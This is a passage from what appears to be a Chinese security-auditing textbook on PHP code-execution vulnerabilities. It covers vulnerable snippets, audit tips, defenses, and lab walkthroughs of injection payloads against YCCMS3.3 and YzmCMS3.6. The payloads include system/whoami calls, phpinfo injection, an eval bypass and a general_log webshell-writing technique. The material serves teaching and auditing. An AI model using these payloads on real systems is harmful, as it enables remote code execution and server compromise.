string create_function(string $args,string $code)\u53C2\u6570args\u4E3A\u8981\u521B\u5EFA\u7684\u51FD\u6570\u53C2\u6570\uFF0C\u53C2\u6570code\u4E3A\u533F\u540D\u51FD\u6570\u5185\u7684\u4EE3\u7801\u3002\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$price = $_GET['price'];\r
\r
$code = 'echo $name.'.'\u7684\u4EF7\u683C\u662F'.$price.';';\r
\r
$b = create_function('$name', $code);\r
\r
$b('iphone');?>\r
\r
\r
\r
create_function\u51FD\u6570\u4F1A\u521B\u5EFA\u865A\u62DF\u51FD\u6570\uFF0C\u521B\u5EFA\u540E\u7684\u865A\u62DF\u51FD\u6570\u4E3A\uFF1A\r
\r
\r
\r
function b($name){\r
\r
 echo $name.'.'\u7684\u4EF7\u683C\u662F'.$price;}\r
\r
\r
\r
\u5F53HTTP\u8BF7\u6C42\u4F20\u9012\u53C2\u6570price\u4E3A123;}phpinfo();/*\u65F6\uFF0C\u5C06\u62FC\u63A5b\u51FD\u6570\u7684\u5185\u5BB9\u5E76\u6267\u884Cphpinfo\u51FD\u6570,\u56FE6-5\u4E3A\u6267\u884C\u7ED3\u679C\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image336.gif)\r
\r
\u56FE6-5 create_fucntion\u4EE3\u7801\u6267\u884C\u7ED3\u679C\r
\r
\uFF086\uFF09  array_map\u51FD\u6570\r
\r
array_map\u51FD\u6570\u4E3A\u6570\u7EC4\u7684\u6BCF\u4E2A\u5143\u7D20\u5E94\u7528\u56DE\u8C03\u51FD\u6570\u3002\u8BE5\u51FD\u6570\u7528\u6CD5\u5982\u4E0B:\r
\r
string array_map(callable $callback,array $array[array,array2\u2026\u2026])\r
\r
array_map\u51FD\u6570\u8FD4\u56DE\u4E3A\u6BCF\u4E2A\u6570\u7EC4\u5143\u7D20\u5E94\u7528callback\u51FD\u6570\u4E4B\u540E\u7684\u6570\u7EC4\u3002callback\u51FD\u6570\u5F62\u53C2\u7684\u6570\u91CF\u548C\u4F20\u7ED9array_map\u51FD\u6570\u7684\u6570\u7EC4\u7684\u6570\u91CF\u5FC5\u987B\u76F8\u540C\u3002\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$func = $_GET['func'];\r
\r
$argv = $_GET['argv'];\r
\r
$array[0] = $argv;\r
\r
array_map($func,$array);?>\r
\r
\r
\r
  \u8F93\u5165HTTP\u8BF7\u6C42\u4E3Ahttp://ip /array_map.php?func=system&argv=whoami\u5C06\u6267\u884C\u51FD\u6570system(\u2018whoami\u2019)\u6253\u5370\u4E3B\u673A\u4FE1\u606F\uFF0C\u5982\u56FE6-6\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image338.gif)\r
\r
\u56FE6-6 assert\u4EE3\u7801\u6267\u884C\u7ED3\u679C\r
\r
\uFF087\uFF09  preg_replace\u51FD\u6570\r
\r
preg_replace\u51FD\u6570\u6267\u884C\u4E00\u4E2A\u6B63\u5219\u8868\u8FBE\u5F0F\u7684\u641C\u7D22\u4E0E\u66FF\u6362\uFF0C\u4E3A\u6570\u7EC4\u7684\u6BCF\u4E2A\u5143\u7D20\u5E94\u7528\u56DE\u8C03\u51FD\u6570\u3002\u8BE5\u51FD\u6570\u7528\u6CD5\u5982\u4E0B:\r
\r
preg_replace(mixed $pattern,mixed $replacement, mixed $subject)\r
\r
preg_replace\u51FD\u6570\u5C06\u641C\u7D22subject\u4E2D\u5339\u914Dpattern\u7684\u90E8\u5206\uFF0C\u7528replacement\u8FDB\u884C\u66FF\u6362\u3002\u503C\u5F97\u6CE8\u610F\u7684\u662F\uFF1A\u5F53\u4E3Apattern\u90E8\u5206\u4E3A/e\u65F6\u4F1A\u4F5C\u4E3Aphp\u4EE3\u7801\u8FDB\u884C\u6267\u884C\uFF0C\u4E0B\u9762\u7ED9\u51FA\u4EE3\u7801\uFF1A\r
\r
\r
\r
<?php\r
\r
$a = $_GET['a'];\r
\r
$b = preg_replace("/abc/e",$a,'abc');?>\r
\r
\r
\r
\u8F93\u5165HTTP\u8BF7\u6C42\u4E3Ahttp://ip/preg_replace.php?a=phpinfo();\u5C06\u4EE5HTTP\u7684GET\u65B9\u5F0F\u83B7\u53D6\u53C2\u6570a\u7684\u503C\u4E3Aphpinfo();\u5E76\u66FF\u6362abc\u540C\u65F6\u6267\u884C\uFF0C\u5982\u56FE6-7\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image340.gif)\r
\r
\u56FE6-7 preg_replace\u4EE3\u7801\u6267\u884C\u7ED3\u679C\r
\r
\uFF088\uFF09  \u53EF\u53D8\u51FD\u6570\u6267\u884C\r
\r
PHP\u652F\u6301\u53EF\u53D8\u51FD\u6570\u7684\u6982\u5FF5\uFF0C\u5982\u679C\u4E00\u4E2A\u53D8\u91CF\u540D\u540E\u6709\u5706\u62EC\u53F7\uFF0C\u4F8B\u5982\uFF1A$a()\u3002PHP\u5C06\u5BFB\u627E\u4E0E\u53D8\u91CF\u503C\u76F8\u540C\u7684\u51FD\u6570\uFF0C\u5E76\u4E14\u5C1D\u8BD5\u6267\u884C\u3002\u8FD9\u5C31\u610F\u5473\u7740\u5728PHP\u4E2D\u53EF\u4EE5\u628A\u51FD\u6570\u540D\u901A\u8FC7\u5B57\u7B26\u4E32\u7684\u65B9\u5F0F\u4F20\u9012\u7ED9\u4E00\u4E2A\u53D8\u91CF\uFF0C\u7136\u540E\u901A\u8FC7\u6B64\u53D8\u91CF\u52A8\u6001\u7684\u8C03\u7528\u51FD\u6570\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FA\u53EF\u53D8\u51FD\u6570\u6267\u884C\u4EE3\u7801\uFF1A\r
\r
\r
\r
<?php\r
\r
function echoit($string){\r
\r
  echo $string;}\r
\r
$func=$_GET['func'];\r
\r
$string=$_GET['string'];\r
\r
echo $func($string);?>\r
\r
\r
\r
\u8F93\u5165HTTP\u8BF7\u6C42\u4E3Ahttp://ip/changefun.php?func=system&string=whoami\u5C06\u4EE5HTTP\u7684GET\u65B9\u5F0F\u83B7\u53D6\u51FD\u6570\u540D\u79F0\u4E3Asystem\u3001\u51FD\u6570\u53C2\u6570\u4E3Awhoami\uFF0C\u5982\u56FE6-8\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image342.gif)\r
\r
\u56FE6-8 \u53EF\u53D8\u51FD\u6570\u4EE3\u7801\u6267\u884C\u7ED3\u679C\r
\r
\uFF089\uFF09\u6587\u4EF6\u5305\u542B\u5F15\u8D77\u4EE3\u7801\u6267\u884C\r
\r
\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u53EF\u4EE5\u4E0E\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u8054\u7528\uFF0C\u5F53PHP\u6587\u4EF6\u5B58\u5728\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u65F6\uFF0C\u4F8B\u5982\uFF1A<?php include($_GET[\u2018a\u2019])?>\u3002\r
\r
\u82E5payload\u4E3A\uFF1Ahttp://ip/test.php?a=data:text/plain,<?php phpinfo();?>\u5219\u53EF\u4EE5\u4E2DPHP\u547D\u4EE4\u3002\r
\r
### 6.1.3 \u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\u7ECF\u9A8C\r
\r
\u672C\u5C0F\u8282\u7ED9\u51FA\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5728\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\u7684\u7ECF\u9A8C\uFF1A\r
\r
l \u5BF9\u5E38\u89C1\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u51FD\u6570\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u7740\u91CD\u5BA1\u8BA1\u51FD\u6570\u5982\u88686-1\u6240\u793A\u3002\r
\r
\u88686-1 \u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\u51FD\u6570\u8868\r
\r
| \u51FD\u6570                                     | \u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u95EE\u9898                                             |\r
| ---------------------------------------- | ------------------------------------------------------------ |\r
| eval() /assert()                         | \u5F53\u8F7D\u5165\u7F13\u5B58\u6216\u6A21\u677F\uFF0C\u5BF9\u53D8\u91CF\u8FC7\u6EE4\u4E0D\u4E25\u5BFC\u81F4\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E             |\r
| preg_replace()                           | \u8BE5\u51FD\u6570\u82E5\u4F7F\u7528e\u4FEE\u9970\u7B26\u5219\u5BF9\u53D8\u91CF\u662F\u5426\u4E25\u683C\u8FC7\u6EE4                      |\r
| call_user_func()  call_user_func_array() | \u5728\u5F88\u591A\u6846\u67B6\u4E2D\u4F7F\u7528\u6B64\u7C7B\u51FD\u6570\u8FDB\u884C\u52A8\u6001\u8C03\u7528\u51FD\u6570\uFF0C\u6B64\u7C7B\u51FD\u6570\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u8F83\u5C11 |\r
| array_map()/create_function()            | \u5176\u4ED6\u51FD\u6570\u7684\u4F20\u53C2\u8FC7\u6EE4\u662F\u5426\u4E25\u683C                                   |\r
\r
l \u5BF9\u53EF\u53D8\u51FD\u6570\u8FDB\u884C\u7740\u91CD\u5BA1\u8BA1\r
\r
PHP\u4EE3\u7801\u4E2D\u53EF\u53D8\u51FD\u6570\u7684\u8FC7\u6EE4\u662F\u5426\u4E25\u683C\uFF0C\u57FA\u4E8E\u6B64\u7C7B\u5199\u6CD5\u53EF\u53D8\u5F62\u51FA\u591A\u79CDWeb\u540E\u95E8\u3002\u4F8B\u5982\uFF1A$_GET($_POST[\u201Cxx\u201D])\u3002\r
\r
### 6.1.4 \u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u9632\u5FA1\r
\r
\u672C\u5C0F\u8282\u7ED9\u51FA\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u7684\u9632\u5FA1\u65B9\u6CD5\uFF0C\u5176\u4E3B\u8981\u5305\u62EC\u5982\u4E0B\u51E0\u70B9\uFF1A\r
\r
l \u5BF9\u4E8E\u5FC5\u987B\u4F7F\u7528eval\u3001assert\u7B49\u51FD\u6570\u6267\u884C\u4EE3\u7801\u65F6\uFF0C\u5E94\u4E25\u683C\u63A7\u5236\u7528\u6237\u8F93\u5165\u53C2\u6570\u5185\u5BB9\uFF0C\u53EF\u4F7F\u7528\u9ED1\u540D\u5355\u3001\u767D\u540D\u5355\u3001\u6B63\u5219\u8868\u8FBE\u5F0F\u8FDB\u884C\u8FC7\u6EE4\u4ECE\u800C\u9632\u5FA1\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u3002\r
\r
l \u5C3D\u91CF\u653E\u5F03\u4F7F\u7528preg_replace\u7684e\u4FEE\u9970\u7B26\uFF0C\u82E5\u5FC5\u987B\u4F7F\u7528\u6B64\u65B9\u6CD5\u5219\u52A1\u5FC5\u4F7F\u7528\u7684\u5355\u5F15\u53F7\u5305\u88F9\u6B63\u5219\u5339\u914D\u7684\u8F93\u51FA\u53C2\u6570\uFF0C\u5373preg_replace\u4E0E\u6B63\u5219\u8868\u8FBE\u5F0F\u7ED3\u5408\u4F7F\u7528\u3002\r
\r
l \u5BF9\u4E8E\u4F20\u9012\u7684\u53EF\u63A7\u4EE3\u7801\uFF0C\u5E94\u52A1\u5FC5\u4F7F\u7528\u5355\u5F15\u53F7\u8FDB\u884C\u4FDD\u62A4\uFF0C\u5E76\u5728\u6267\u884C\u524D\u4F7F\u7528\u51FD\u6570addslashes\u3001\u9B54\u672F\u5F15\u53F7\u3001htmlspecialchars\u3001htmlentities\u3001mysql_real_escap_string\u3001escapeshellarg\u7B49\u8FDB\u884C\u4FDD\u62A4\u3002\r
\r
l \u4F7F\u7528safe_mode_exec_dir\u6765\u6267\u884C\u53EF\u6267\u884C\u6587\u4EF6\u7684\u8DEF\u5F84\uFF0C\u5728\u4EE3\u7801\u5F00\u53D1\u9636\u6BB5\u5C06\u4F1A\u4F7F\u7528\u7684\u547D\u4EE4\u63D0\u524D\u653E\u5165\u6B64\u8DEF\u5F84\u5185\uFF0C\u4F8B\u5982\uFF1A\r
\r
\r
\r
<?php\r
\r
safe_mode=on\r
\r
safe_mode_exec_dir=/usr/local/php/bin/\r
\r
?>\r
\r
\r
\r
## 6.2 \u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\u5B9E\u8DF5\r
\r
### 6.2.1 YCCMS3.3\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF9YCCMS3.3\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u7BA1\u7406\u5458\u9996\u9875\u6A21\u5757\u4E2D\u662F\u5426\u5B58\u5728\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u3002\u901A\u8FC7\u8BE5\u5E94\u7528\u4E2DFactory\u7C7B\u7684file_exists\u5B58\u5728\u7684Bug\u6267\u884Ceval\u51FD\u6570\uFF0C\u5B8C\u6210\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80036.1.1\u8282\uFF1A\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u7B80\u4ECB\uFF1B6.1.2\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5E38\u89C1\u51FD\u6570\uFF1B6.1.3\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\u7ECF\u9A8C\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1BYCCMS3.3\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09 \u5BA1\u8BA1\u9636\u6BB5\r
\r
\u70B9\u51FB\u5C55\u5F00\u5DE6\u4FA7admin\u76EE\u5F55\uFF0C\u5728\u5F39\u51FA\u7684\u4E0B\u62C9\u5217\u8868\u4E2D\u53CC\u51FBindex.php\u9875\u9762\uFF0C\u53F3\u4FA7\u9875\u9762\u53EF\u4EE5\u770B\u5230\u76F8\u5173\u4EE3\u7801\uFF0C\u5982\u56FE6-9\u6240\u793A\u3002\u4EE3\u7801\u4E2D\u5305\u542B/config/run.inc.php\u6587\u4EF6\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image344.jpg)\r
\r
\u56FE6-9 index.php\u4EE3\u7801\r
\r
\u56FE6-10\u4E3Aconfig\\run.inc.php\u6587\u4EF6\u4EE3\u7801\uFF0C\u5176\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u8FDB\u884C\u521D\u59CB\u5316\u4E00\u4E9B\u5E38\u91CF\u548C\u914D\u7F6E\uFF0C\u5305\u62EC\uFF1Asession\u5F00\u542F\u60C5\u51B5\u3001\u8D85\u65F6\u65F6\u95F4\u3001\u7F16\u7801\u8BBE\u7F6E\u7B49\u3002\r
\r
l \u5F53\u8FDB\u884C\u521D\u59CB\u5316\u7C7B\u4E14\u8BE5\u7C7B\u4E0D\u5B58\u5728\u65F6\uFF0C\u7CFB\u7EDF\u4F1A\u81EA\u52A8\u8C03\u7528autoload\u51FD\u6570\u52A0\u8F7D\u6240\u9700\u7C7B\u540D\u3002\r
\r
l \u6700\u540E\u8C03\u7528Factory\u7C7B\u7684setAction\u65B9\u6CD5\uFF0C\u5305\u542B/public/class/Factory.class.php\u6587\u4EF6\uFF0C\u56E0\u6B64\u5BA1\u8BA1Factory.class.php\u6587\u4EF6\u5185\u5BB9\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image346.jpg)\r
\r
\u56FE6-10 run.inc.php\u4EE3\u7801\r
\r
Factory.class.php\u662FFactory\u7C7B\u7684\u5B9A\u4E49\u6587\u4EF6\uFF0C\u5982\u56FE6-11\u6240\u793A\u3002\u8BE5\u6587\u4EF6\u5305\u62EC\u65B9\u6CD5\u662F\uFF1AsetAction\u3001setModel\u3001getA\u3002setAction()\u51FD\u6570\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u8C03\u7528getA()\u65B9\u6CD5\u83B7\u53D6GET\u4F20\u8F93\u7684\u53C2\u6570a\u5E76\u8D4B\u503C\u7ED9\u53D8\u91CFa\u3002\r
\r
l \u5229\u7528in_array()\u51FD\u6570\u8FDB\u884C\u68C0\u67E5\uFF0C\u5982\u679C$_a\u7684\u503C\u5305\u542B\u6570\u7EC4\u4E2D\u7684\u5173\u952E\u5B57\u4E14Session\u4E2D\u4E0D\u5305\u542Badmin\uFF0C\u5219\u9875\u9762\u5C06\u8DF3\u8F6C\u5230http://ip?a=login\u9875\u9762\u3002\r
\r
l file_exists()\u51FD\u6570\u68C0\u67E5\u8DEF\u5F84\u201C/controller/$a.\u2019Action.class.php\u2019\u201D\u6587\u4EF6\u662F\u5426\u5B58\u5728\uFF0C\u82E5\u4E0D\u5B58\u5728\u5219\u5C06$_a\u8D4B\u503C\u6210index\uFF0C\u4F7F\u5176\u8DF3\u8F6C\u5230index\u9875\u9762\u3002\r
\r
l eval('self::$_obj = new '.ucfirst($_a).'Action();')\u51FD\u6570\u6267\u884CPHP\u4EE3\u7801\uFF0C\u8C03\u7528ucfirst\u51FD\u6570\u5C06\u53D8\u91CF$_a\u8F6C\u6362\u4E3A\u5927\u5199\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image348.jpg)\r
\r
\u56FE6-11 Factory.class.php\u6587\u4EF6\u4EE3\u7801\r
\r
\u80FD\u591F\u8BA9eval\u6210\u529F\u6267\u884C\u4EE3\u7801\uFF0C\u9700\u8981\u6EE1\u8DB3\u4E24\u4E2A\u6761\u4EF6\uFF0C\u5206\u522B\u662F\uFF1A\r
\r
l $_a\u53D8\u91CF\u7528\u6237\u53EF\u63A7\uFF1B\r
\r
l \u6210\u529F\u7ED5\u8FC7file_exists\u51FD\u6570\u6821\u9A8C\u3002\r
\r
file_exists\u51FD\u6570\u4F5C\u7528\u662F\u68C0\u67E5/controller/$a.\u2019Action.class.php\u2019\u6587\u4EF6\u662F\u5426\u5B58\u5728\uFF0C\u4F46\u662F\u8BE5\u51FD\u6570\u5728\u8FDB\u884C\u68C0\u67E5\u65F6\u4F1A\u5B58\u5728\u4E00\u4E2A\u6F0F\u6D1E\u3002\u5373\uFF1A\u5982\u679C\u4F20\u9012\u53C2\u6570$a\u7684\u503C\u4E3Aadmin;/../\uFF0C\u62FC\u63A5\u540E\u7684\u5B57\u7B26\u4E32\u4E3A/controller/admin;/../Action.class.php\u3002\r
\r
file_exists\u51FD\u6570\u5141\u8BB8\u8DEF\u5F84\u4E2D\u6709\u7279\u6B8A\u5B57\u7B26\uFF0C\u5E76\u4E14\u9047\u5230/../\u4F1A\u8FD4\u56DE\u5230\u4E0A\u7EA7\u76EE\u5F55\uFF0C\u4ECE\u800C\u5224\u65AD\u7ED3\u679C\u4E3ATrue\u3002\u53EF\u5229\u7528\u8BE5\u7B56\u7565\u7ED5\u8FC7file_exists\uFF08\uFF09\u51FD\u6570\u68C0\u67E5\uFF0C\u6700\u540E\u5229\u7528eval\u51FD\u6570\u6267\u884C\u591A\u6761\u8BED\u53E5\uFF0C\u4F8B\u5982\uFF1Aeval(echo 1;echo 2;);\u53EF\u4EE5\u6210\u529F\u6267\u884Cecho 1\u548Cecho 2\u4E24\u6761\u8BED\u53E5\u3002\r
\r
\u81F3\u6B64\u5206\u6790\u51FA\u8BE5CMS\u9996\u9875\u5B58\u5728\u7684\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF0C\u5206\u6790\u7ED3\u679C\u5982\u56FE6-12\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image350.jpg)\r
\r
\u56FE6-12 CMS\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5206\u6790\u56FE\r
\r
\uFF082\uFF09 \u6D4B\u8BD5\u5229\u7528\u9636\u6BB5\r
\r
\u6F0F\u6D1E\u9875\u9762\u4E3Ahttp://192.168.0.11/admin/index.php\uFF0C\u8BF7\u6C42\u9875\u9762\u5982\u56FE6-13\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image352.gif)\r
\r
\u56FE6-13 \u6F0F\u6D1E\u9875\u9762\r
\r
\u4E0A\u8FF0URL\u540E\u9762\u8F93\u5165Payload:?a=Factory();phpinfo();//../\u8BBF\u95EE\u6548\u679C\u5982\u56FE6-14\u6240\u793A\u3002\r
\r
\u8BE5Payload\u53EF\u4EE5\u5C06self::$_obj = new '.ucfirst($_a).'Action();\u4EE3\u7801\u62FC\u63A5\u4E3Aself::$_obj = new FACTORY();PHPINFO();//../ACTION();\u5176\u88AB\u5206\u5272\u4E3A\u4E09\u6BB5PHP\u4EE3\u7801\u6267\u884C\uFF1A\r
\r
l \u65B0\u5EFAFACTORY\u5BF9\u8C61\uFF1Aself::$_obj = new FACTORY();\r
\r
l \u6253\u5370PHP\u4FE1\u606F\uFF1APHPINFO();\r
\r
l \u8C03\u7528\u4E0A\u4E00\u7EA7\u7684ACTION\u65B9\u6CD5\uFF1A//../ACTION();\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image354.gif)\r
\r
\u56FE6-14 \u4EE3\u7801\u6267\u884C\u7ED3\u679C\u56FE\r
\r
### 6.2.2 YzmCMS3.6\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF9YzmCMS3.6\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u7CFB\u7EDF\u7BA1\u7406\u6A21\u5757\u4E2DSQL\u547D\u4EE4\u884C\u529F\u80FD\u662F\u5426\u5B58\u5728\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u3002\u901A\u8FC7\u7ED5\u8FC7\u8BE5\u529F\u80FD\u540E\u53F0\u4EE3\u7801\u5B9A\u4E49\u7684\u975E\u6CD5\u5B57\u7B26\u4E32\u68C0\u9A8C\u529F\u80FD\uFF0C\u4ECE\u800C\u4E3A\u8BE5CMS\u5199\u5165\u4EE3\u7801\u6267\u884C\u6076\u610F\u4EE3\u7801\u4ECE\u800C\u63A7\u5236\u670D\u52A1\u5668\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image356.jpg)\r
\r
\u56FE6-15 YzmCMS3.6\u7684SQL\u547D\u4EE4\u529F\u80FD\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80036.1.1\u8282\uFF1A\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u7B80\u4ECB\uFF1B6.1.2\u8282\uFF1A\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5E38\u89C1\u51FD\u6570\uFF1B6.1.3\u8282\uFF1A\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\u7ECF\u9A8C\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1BYzmCMS3.6\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09  \u5BA1\u8BA1\u9636\u6BB5\r
\r
application\\admin\\view\\sql.html\u6587\u4EF6\u5B58\u5728\u4E00\u4E2AFORM\u8868\u5355\uFF0C\u4EE3\u7801\u5982\u56FE6-16\u6240\u793A\u3002\u8BE5\u9875\u9762\u529F\u80FD\u4E3A\u6267\u884CSQL\u8BED\u53E5\uFF0C\u5176\u901A\u8FC7\u5728input\u6807\u7B7E\u4E2D\u70B9\u51FB\u201C\u6267\u884C\u5355\u6761SQL\u201D\u6309\u94AE\u89E6\u53D1setaction\u65B9\u6CD5\u4F20\u9012\u53C2\u6570single\u3002setaction\u65B9\u6CD5\u4E3A\u4E00\u6BB5JS\u4EE3\u7801\uFF0C\u5176\u4E3B\u8981\u4F5C\u7528\u662F\u5C06action\u53C2\u6570\u8D4B\u503C\u4E3Asingle\u5E76\u5BF9application\\admin\\controller\\sql.class.php\u7C7B\u8FDB\u884C\u521D\u59CB\u5316\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image358.jpg)\r
\r
\u56FE6-16 \u6267\u884CSQL\u8BED\u53E5\u529F\u80FD\u524D\u53F0\u4EE3\u7801\r
\r
sql.class.php\u6587\u4EF6\u4EE3\u7801\u5982\u56FE6-17\u6240\u793A\uFF0C\u8BE5SQL\u7C7B\u7684\u521D\u59CB\u5316\u65B9\u6CD5\u6D41\u7A0B\uFF1A\r
\r
l \u9996\u5148\u7A0B\u5E8F\u5224\u65AD\u6A21\u5F0F\u5F15\u53F7\u51FD\u6570MAGIC_QUOTES_GPC\u662F\u5426\u5F00\u542F\uFF0C\u82E5\u672A\u5F00\u542F\u5219\u5BF9\u53C2\u6570sqlstr\u503C\u4F7F\u7528stripslashes\u51FD\u6570\u8FC7\u6EE4\u3002\r
\r
l \u68C0\u67E5$sqlstr\u53D8\u91CF\u4E2D\u662F\u5426\u5B58\u5728\u975E\u6CD5\u5B57\u7B26\u4E32\u5305\u62EC\uFF1A\r
\r
  \u5305\u542Boutfile\u7684\u5B57\u7B26\u4E32\uFF1B\r
\r
  \u5305\u542B.php\u7684\u5B57\u7B26\u4E32\uFF1B\r
\r
  \u5339\u914D\u6B63\u5219\u8868\u8FBE\u5F0F\u4E3A/^drop(.*)database/i\u7684\u5B57\u7B26\u4E32\uFF0C\r
\r
\u82E5\u5B58\u5728\u975E\u6CD5\u5B57\u7B26\u4E32\u5219\u6253\u5370\u9519\u8BEF\u4FE1\u606F\uFF0C\u5426\u5219\u6267\u884CSQL\u8BED\u53E5\u3002\u8BE5\u529F\u80FD\u5B58\u5728\u6F0F\u6D1E\uFF0C\u53EF\u4EE5\u901A\u8FC7\u6784\u9020payload\u7ED5\u8FC7sql.class.php\u6587\u4EF6\u4E2D\u7684\u68C0\u6D4B\u7B97\u6CD5\uFF0C\u7136\u540E\u4F7F\u7528MySQL\u529F\u80FD\u5199\u5165\u6728\u9A6C\uFF0C\u4ECE\u800C\u6784\u9020\u5B58\u5728\u4EE3\u7801\u6267\u884C\u6F0F\u6D1EPHP\u8BED\u53E5\uFF0C\u83B7\u53D6\u670D\u52A1\u5668\u4FE1\u606F\u6216\u63A7\u5236\u670D\u52A1\u5668\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image360.jpg)\r
\r
\u56FE6-17 sql.class.php\u6587\u4EF6\u4EE3\u7801\r
\r
\uFF082\uFF09  \u6D4B\u8BD5\u5229\u7528\u9636\u6BB5\r
\r
\u867D\u7136outfile\u5173\u952E\u5B57\u88AB\u7981\u6B62\uFF0C\u4F46\u53EF\u4EE5\u4F7F\u7528SQL\u8BED\u53E5\u5411\u8BE5CMS\u65E5\u5FD7\u4E2D\u5199\u5165\u6076\u610F\u6587\u4EF6\u3002\u82E5\u5199\u5165\u811A\u672C\u6587\u4EF6\u4EE5.php\u7ED3\u5C3E\uFF0C\u5219\u4F1A\u88AB\u68C0\u6D4B\u4E3A\u975E\u6CD5\u5B57\u7B26\u4E32\u3002\u56E0\u6B64\uFF0C\u4F7F\u7528MySQL\u4E2D\u7684concat\u51FD\u6570\u8FDE\u63A5\u5B57\u7B26\u4E32\u4ECE\u800C\u7ED5\u8FC7\u68C0\u6D4B\u3002\u4F8B\u5982\uFF1ACONCAT(\u201Ctest.\u201D,\u201Cphp\u201D)\u5219\u4F1A\u7ED5\u8FC7\u68C0\u6D4B\u673A\u5236\u5E76\u62FC\u63A5\u4E3Atest.php\u6587\u4EF6\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FA\u672CCMS\u4F7F\u7528\u7684Payload:\r
\r
l show variables like '%general%';  #\u67E5\u770BMySQL\u65E5\u5FD7\u914D\u7F6E\r
\r
l set global general_log=on;   #\u8BBE\u7F6E\u5F00\u542Fgeneral log\u6A21\u5F0F\r
\r
